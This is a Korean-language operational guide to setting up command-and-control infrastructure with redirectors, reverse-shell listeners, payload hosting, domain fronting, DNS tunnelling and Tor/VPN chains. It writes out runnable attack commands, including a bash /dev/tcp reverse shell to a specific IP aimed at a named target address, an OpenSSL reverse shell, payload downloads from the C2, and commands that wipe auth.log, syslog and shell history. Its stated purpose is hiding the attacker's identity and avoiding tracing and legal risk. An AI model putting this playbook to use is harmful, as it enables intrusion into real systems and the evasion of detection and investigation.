# C2 인프라 활용 완전 가이드

## 📋 목차

1. [C2 인프라 개요](#c2-인프라-개요)
2. [아키텍처](#아키텍처)
3. [서버 설정](#서버-설정)
4. [사용 방법](#사용-방법)
5. [고급 기법](#고급-기법)
6. [보안 및 은닉](#보안-및-은닉)

---

## C2 인프라 개요

### 왜 C2 인프라가 필요한가?

**단순 공격의 문제점:**
```
공격자 로컬 PC → 대상 서버
```

- ✗ 공격자 실제 IP 노출
- ✗ 로그에 IP 기록됨
- ✗ 추적 가능
- ✗ 법적 위험

**C2 인프라 사용:**
```
공격자 로컬 → 리다이렉터 → C2 서버 → 대상 서버
```

- ✓ 공격자 실제 IP 숨김
- ✓ 다층 구조로 추적 어려움
- ✓ 서버 차단되어도 다른 서버 사용 가능
- ✓ 전문적인 레드팀 운영

### C2 인프라 구성 요소

#### 1. C2 서버 (Command & Control)
- **역할:** 명령 제어 중심 서버
- **기능:**
  - 리버스 쉘 리스너
  - 페이로드 호스팅
  - 데이터 수집
  - 백도어 관리

#### 2. 리다이렉터 서버 (Redirector)
- **역할:** 트래픽 중계 서버
- **기능:**
  - IP 주소 숨김
  - C2 서버로 트래픽 포워딩
  - 여러 개 사용 가능 (차단 대비)

#### 3. 오퍼레이터 서버 (Operator)
- **역할:** 공격자가 직접 사용하는 서버
- **기능:**
  - 공격 스크립트 실행
  - 로그 분석
  - 보고서 작성

---

## 아키텍처

### 기본 구조

```
┌─────────────────────────────────────────────────────────────┐
│                    C2 인프라 아키텍처                         │
└─────────────────────────────────────────────────────────────┘

[공격자 로컬 PC]
       ↓ SSH 접속
[오퍼레이터 서버] ← 공격 스크립트 실행
       ↓ 명령 전송
[리다이렉터 서버 1] ← 대상이 연결하는 IP
       ↓ 포워딩
[C2 서버] ← 실제 명령 제어
       ↑ 리버스 쉘 연결
[대상 서버] ← 공격 대상
```

### 고급 구조 (다중 리다이렉터)

```
                    [공격자 로컬]
                          ↓
                  [오퍼레이터 서버]
                    ↙    ↓    ↘
         [리다이렉터 1] [2] [3] ← 여러 개 사용
                    ↘    ↓    ↙
                    [C2 서버]
                          ↑
                    [대상 서버]
```

**장점:**
- 리다이렉터 1개 차단되어도 2, 3 사용 가능
- 로드 밸런싱
- 추적 어려움

### 실제 예시

**사용자 환경:**
```
오퍼레이터 서버: 52.192.8.114
리다이렉터 서버: 57.181.28.7
C2 서버: (제공 예정)
대상 서버: 43.201.154.142
```

**트래픽 플로우:**
```
대상 (43.201.154.142)
    ↓ 리버스 쉘: bash -i >& /dev/tcp/57.181.28.7/4444 0>&1
리다이렉터 (57.181.28.7:4444)
    ↓ socat으로 포워딩
C2 서버 (?:4444)
    ↓ nc -lvnp 4444 리스너
오퍼레이터 서버 (52.192.8.114)
    ↓ SSH 터널링
공격자 로컬 PC
```

---

## 서버 설정

### 1. C2 서버 설정

#### AWS EC2 인스턴스 생성

```bash
# 1. AWS CLI로 인스턴스 생성 (또는 콘솔)
aws ec2 run-instances \
    --image-id ami-0c55b159cbfafe1f0 \
    --instance-type t3.micro \
    --key-name my-key \
    --security-group-ids sg-xxxxxx \
    --subnet-id subnet-xxxxxx \
    --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=C2-Server}]'

# 2. 보안 그룹 설정
aws ec2 authorize-security-group-ingress \
    --group-id sg-xxxxxx \
    --protocol tcp \
    --port 4444 \
    --cidr 0.0.0.0/0  # 또는 리다이렉터 IP만

aws ec2 authorize-security-group-ingress \
    --group-id sg-xxxxxx \
    --protocol tcp \
    --port 22 \
    --cidr YOUR_IP/32  # SSH (본인 IP만)
```

#### C2 서버 초기 설정

```bash
# SSH 접속
ssh -i my-key.pem ubuntu@C2_IP

# 업데이트
sudo apt update && sudo apt upgrade -y

# 필수 도구 설치
sudo apt install -y \
    netcat \
    socat \
    tmux \
    vim \
    python3 \
    python3-pip \
    git

# 방화벽 설정
sudo ufw allow 22/tcp    # SSH
sudo ufw allow 4444/tcp  # 리버스 쉘
sudo ufw allow 8000/tcp  # HTTP 서버
sudo ufw enable

# 디렉토리 구조
mkdir -p /opt/c2/{payloads,logs,data}
cd /opt/c2
```

#### 리스너 설정 (tmux 사용)

```bash
# tmux 세션 시작
tmux new -s c2

# 리스너 실행
nc -lvnp 4444

# tmux 나가기 (백그라운드 실행)
# Ctrl+B, D

# 다시 들어가기
tmux attach -t c2
```

#### 페이로드 호스팅

```bash
# HTTP 서버로 페이로드 호스팅
cd /opt/c2/payloads

# LinPEAS 다운로드
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

# 권한 상승 스크립트 (기존 것 복사)
# ...

# HTTP 서버 실행
python3 -m http.server 8000 &

# 대상 서버에서 다운로드:
# wget http://C2_IP:8000/linpeas.sh
```

### 2. 리다이렉터 서버 설정

#### 리다이렉터 인스턴스 생성

```bash
# AWS EC2 인스턴스 생성 (C2와 동일)
# 보안 그룹: TCP 4444 전체 허용 (0.0.0.0/0)
```

#### Socat 리다이렉션 설정

```bash
# SSH 접속
ssh -i my-key.pem ubuntu@57.181.28.7

# Socat 설치
sudo apt update
sudo apt install -y socat

# 포트 포워딩 (4444 → C2:4444)
socat TCP-LISTEN:4444,fork TCP:C2_IP:4444

# 또는 백그라운드 실행
nohup socat TCP-LISTEN:4444,fork TCP:C2_IP:4444 > /dev/null 2>&1 &

# 확인
netstat -tulnp | grep 4444
```

#### iptables 리다이렉션 (대안)

```bash
# iptables 사용
sudo iptables -t nat -A PREROUTING -p tcp --dport 4444 -j DNAT --to-destination C2_IP:4444
sudo iptables -t nat -A POSTROUTING -j MASQUERADE

# 영구 저장
sudo apt install iptables-persistent
sudo netfilter-persistent save
```

#### 다중 포트 리다이렉션

```bash
# 여러 포트 포워딩
socat TCP-LISTEN:4444,fork TCP:C2_IP:4444 &  # 리버스 쉘
socat TCP-LISTEN:8000,fork TCP:C2_IP:8000 &  # HTTP 서버
socat TCP-LISTEN:443,fork TCP:C2_IP:443 &    # HTTPS (은닉)
```

### 3. 오퍼레이터 서버 설정

#### 설정

```bash
# SSH 접속
ssh -i my-key.pem ubuntu@52.192.8.114

# 공격 도구 설치
sudo apt install -y \
    python3 \
    python3-pip \
    nmap \
    nikto \
    sqlmap \
    git

# Python 패키지
pip3 install requests beautifulsoup4 pillow

# 레포지토리 클론 (공격 스크립트)
git clone https://github.com/your-org/red-team-tools.git /opt/tools

# 또는 직접 업로드
scp -i my-key.pem defense_evasion_auto.py ubuntu@52.192.8.114:/opt/tools/
```

#### SSH 터널링 설정

```bash
# 로컬 PC에서 오퍼레이터로 터널
ssh -L 4444:C2_IP:4444 -i my-key.pem ubuntu@52.192.8.114

# 이제 로컬 4444 포트 = C2 4444 포트
nc -lvnp 4444  # 로컬에서 리스너
```

---

## 사용 방법

### 시나리오 1: 기본 C2 사용

#### 단계 1: C2 서버에서 리스너 시작

```bash
# C2 서버 (SSH 접속)
ssh -i my-key.pem ubuntu@C2_IP

# tmux 세션
tmux new -s listener

# 리스너
nc -lvnp 4444
```

#### 단계 2: 리다이렉터 설정

```bash
# 리다이렉터 서버
ssh -i my-key.pem ubuntu@57.181.28.7

# 포워딩 (이미 설정했으면 skip)
socat TCP-LISTEN:4444,fork TCP:C2_IP:4444 &
```

#### 단계 3: 공격 실행

```bash
# 오퍼레이터 서버 또는 로컬
python3 defense_evasion_auto.py 43.201.154.142 57.181.28.7 \
    --port 4444
```

#### 단계 4: 리버스 쉘 확보

C2 서버에서:
```bash
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 43.201.154.142 52431

bash-4.2$ whoami
apache

bash-4.2$ hostname
target-server
```

### 시나리오 2: 다중 리다이렉터 사용

#### 설정

```bash
# 리다이렉터 1 (57.181.28.7)
socat TCP-LISTEN:4444,fork TCP:C2_IP:4444 &

# 리다이렉터 2 (다른 IP)
socat TCP-LISTEN:4444,fork TCP:C2_IP:4444 &

# 리다이렉터 3 (다른 IP)
socat TCP-LISTEN:4444,fork TCP:C2_IP:4444 &
```

#### 사용

```bash
# 리다이렉터 1 사용
python3 defense_evasion_auto.py 43.201.154.142 57.181.28.7

# 리다이렉터 1 차단되면 2 사용
python3 defense_evasion_auto.py 43.201.154.142 REDIRECTOR2_IP

# 2도 차단되면 3 사용
python3 defense_evasion_auto.py 43.201.154.142 REDIRECTOR3_IP
```

### 시나리오 3: 도메인 프론팅

#### 개념

```
대상 서버 → cloudfront.amazonaws.com (정상 도메인)
    ↓ Host 헤더 변조
실제 C2 서버
```

#### 설정

```bash
# CloudFront 배포 생성
# Origin: C2_IP
# CNAME: your-legit-domain.com

# 공격 스크립트 수정
# Host 헤더를 정상 도메인으로
```

---

## 고급 기법

### 1. HTTPS 암호화 터널

#### 개요
HTTP는 평문이므로 IDS/IPS에서 탐지 가능. HTTPS 사용으로 암호화.

#### 설정

```bash
# C2 서버에 SSL 인증서 설치
sudo apt install certbot
sudo certbot certonly --standalone -d c2.yourdomain.com

# Nginx 리버스 프록시
sudo apt install nginx

# /etc/nginx/sites-available/c2
server {
    listen 443 ssl;
    server_name c2.yourdomain.com;

    ssl_certificate /etc/letsencrypt/live/c2.yourdomain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/c2.yourdomain.com/privkey.pem;

    location / {
        proxy_pass http://127.0.0.1:4444;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
    }
}

# 활성화
sudo ln -s /etc/nginx/sites-available/c2 /etc/nginx/sites-enabled/
sudo systemctl restart nginx

# 방화벽
sudo ufw allow 443/tcp
```

#### 사용

```bash
# OpenSSL 리버스 쉘
openssl s_client -connect c2.yourdomain.com:443 -quiet | /bin/bash 2>&1 | openssl s_client -connect c2.yourdomain.com:443 -quiet
```

### 2. DNS 터널링

#### 개념
HTTP/HTTPS 차단되어도 DNS는 거의 항상 허용됨. DNS 쿼리로 데이터 전송.

#### 도구: dnscat2

```bash
# C2 서버
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server
gem install bundler
bundle install
ruby ./dnscat2.rb yourdomain.com

# 대상 서버
wget http://C2_IP:8000/dnscat
chmod +x dnscat
./dnscat --dns server=c2.yourdomain.com
```

### 3. 다단계 C2 (Nested C2)

#### 구조

```
공격자 → C2-1 → C2-2 → C2-3 → 대상
```

#### 설정

```bash
# C2-1
socat TCP-LISTEN:4444,fork TCP:C2-2_IP:4444

# C2-2
socat TCP-LISTEN:4444,fork TCP:C2-3_IP:4444

# C2-3
nc -lvnp 4444
```

**효과:** 추적 극도로 어려움

### 4. Malleable C2 프로파일 (Cobalt Strike)

Cobalt Strike 같은 상용 도구 사용 시 트래픽을 정상 웹 트래픽처럼 위장.

```
GET /search?q=news HTTP/1.1
Host: www.google.com
User-Agent: Mozilla/5.0...

(실제로는 C2 명령어가 숨겨져 있음)
```

---

## 보안 및 은닉

### 1. 서버 하드닝

#### C2 서버 보안

```bash
# 1. SSH 키 인증만 허용
sudo vim /etc/ssh/sshd_config
# PasswordAuthentication no
# PubkeyAuthentication yes

sudo systemctl restart sshd

# 2. Fail2Ban 설치
sudo apt install fail2ban
sudo systemctl enable fail2ban

# 3. 불필요한 서비스 비활성화
sudo systemctl disable apache2
sudo systemctl disable mysql

# 4. 방화벽 최소 권한
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow 22/tcp from YOUR_IP
sudo ufw allow 4444/tcp from REDIRECTOR_IP
sudo ufw enable
```

### 2. 로그 관리

#### 공격 로그 암호화

```bash
# 로그 파일 암호화
cd /opt/c2/logs
tar -czf attack_$(date +%Y%m%d).tar.gz *.log
openssl enc -aes-256-cbc -salt -in attack_*.tar.gz -out attack_*.enc
rm -f attack_*.tar.gz *.log

# 복호화
openssl enc -d -aes-256-cbc -in attack_*.enc -out attack.tar.gz
tar -xzf attack.tar.gz
```

#### C2 서버 로그 삭제

```bash
# 침투 테스트 종료 후
sudo bash -c 'echo "" > /var/log/auth.log'
sudo bash -c 'echo "" > /var/log/syslog'
history -c
rm -f ~/.bash_history
```

### 3. 익명성 강화

#### Tor 사용

```bash
# C2 서버를 Tor Hidden Service로
sudo apt install tor

# /etc/tor/torrc
HiddenServiceDir /var/lib/tor/c2_service/
HiddenServicePort 4444 127.0.0.1:4444

sudo systemctl restart tor

# Onion 주소 확인
sudo cat /var/lib/tor/c2_service/hostname
# abc123.onion

# 접속
torsocks nc -lvnp 4444
```

#### VPN 체인

```
공격자 → VPN1 → VPN2 → VPN3 → C2
```

```bash
# 다중 VPN 사용
sudo openvpn --config vpn1.ovpn &
# VPN1 연결 후
sudo openvpn --config vpn2.ovpn &
# ...
```

### 4. 서버 폐기

테스트 종료 후:

```bash
# 1. 모든 로그 삭제
sudo bash /opt/c2/cleanup.sh

# 2. AWS 인스턴스 종료
aws ec2 terminate-instances --instance-ids i-xxxxxx

# 또는 스냅샷 삭제 후 종료
aws ec2 delete-snapshot --snapshot-id snap-xxxxxx
```

---

## 트러블슈팅

### 문제 1: 리버스 쉘 연결 안됨

**확인:**

```bash
# 1. C2에서 리스너 실행 중인지
netstat -tulnp | grep 4444

# 2. 리다이렉터 포워딩 작동하는지
# 리다이렉터에서
telnet C2_IP 4444

# 3. 방화벽 문제
# C2 서버
sudo ufw status
sudo ufw allow 4444/tcp

# AWS 보안 그룹
# Inbound TCP 4444 허용 확인
```

### 문제 2: Socat 포워딩 안됨

**확인:**

```bash
# Socat 프로세스 확인
ps aux | grep socat

# 재시작
pkill socat
socat TCP-LISTEN:4444,fork TCP:C2_IP:4444 &

# 로그 확인
socat -d -d TCP-LISTEN:4444,fork TCP:C2_IP:4444
```

### 문제 3: SSH 터널 끊김

**해결:**

```bash
# SSH keep-alive 설정
# ~/.ssh/config
Host *
    ServerAliveInterval 60
    ServerAliveCountMax 3

# 재연결 스크립트
while true; do
    ssh -L 4444:C2_IP:4444 ubuntu@OPERATOR_IP
    sleep 5
done
```

---

## 체크리스트

### 배포 전

- [ ] C2 서버 인스턴스 생성
- [ ] 리다이렉터 서버 인스턴스 생성
- [ ] 보안 그룹 설정 (포트 오픈)
- [ ] SSH 키 설정
- [ ] 도구 설치 (nc, socat, tmux 등)

### 공격 중

- [ ] C2 리스너 실행
- [ ] 리다이렉터 포워딩 확인
- [ ] 페이로드 호스팅 (HTTP 서버)
- [ ] 리버스 쉘 연결 확인
- [ ] 로그 저장

### 종료 후

- [ ] 로그 백업
- [ ] 서버 로그 삭제
- [ ] 백도어 제거 (승인된 경우)
- [ ] 인스턴스 종료 또는 스냅샷
- [ ] 보고서 작성

---

## 빠른 참조

### C2 서버 명령어

```bash
# 리스너
tmux new -s c2
nc -lvnp 4444

# 페이로드 호스팅
cd /opt/c2/payloads
python3 -m http.server 8000 &

# 로그 확인
tail -f /var/log/auth.log
```

### 리다이렉터 명령어

```bash
# 포워딩
socat TCP-LISTEN:4444,fork TCP:C2_IP:4444 &

# 확인
netstat -tulnp | grep 4444
```

### 오퍼레이터 명령어

```bash
# 공격 실행
python3 defense_evasion_auto.py TARGET_IP REDIRECTOR_IP

# SSH 터널
ssh -L 4444:C2_IP:4444 ubuntu@OPERATOR_IP
```

---

**작성일:** 2025-01-14
**버전:** 1.0
**목적:** C2 인프라 구축 및 관리

**전문적인 레드팀 운영을 위한 필수 가이드**
